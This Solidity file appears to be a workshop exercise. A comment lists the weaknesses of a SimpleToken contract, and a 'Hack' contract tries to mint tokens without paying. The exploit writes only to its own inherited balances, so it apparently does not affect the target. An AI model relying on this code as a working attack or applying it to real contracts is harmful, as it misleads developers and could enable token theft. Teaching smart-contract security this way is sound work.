// SPDX-License-Identifier: MIT
pragma solidity ^0.4.10;
import "../contracts/SolidityHackingWorkshop.sol";

/*
* @title: HSC.
* @author: Anthony (fps) https://github.com/fps8k .
* @dev: 
*/

/*
* @dev:
*
* Vulnerabilities observed:
* - There is no validation that the msg.value sent in the `buyToken()` function is > 1 Ether.
* - Any purchase less than 1 Eth reads as 0 leading to loss of funds on the purchaser side.
* - sendToken() doesn't validate for 0 addresses.
* - sendToken() does not validate that the senders token is > amount.
* - There is no re-entrancy attack precautions.
* - THE MOST DANGEROUS 
* - - TRANSFERING AND OWNING TOKENS WITHOUT TRANSFERING A SINGLE ETHER.
*
* Exploits attempted:
* - Funding without payment.
*/

contract Hack is SimpleToken
{
    SimpleToken _simple_token = new SimpleToken();
    address owner;

    constructor()
    {
        owner = msg.sender;
    }

    modifier onlyowner()
    {
        require(msg.sender == owner, "!Owner");
        _;
    }

    /*
    * @dev:
    * 
    * This funds the contract with large amounts of tokens that are+ purchases without payment.
    *
    *
    * @param:
    *
    * uint256 funds => Amount desired to fund.
    */

    function fundTokensExploit(uint256 funds) public onlyowner
    {
        balances[address(this)] += funds;
    }
}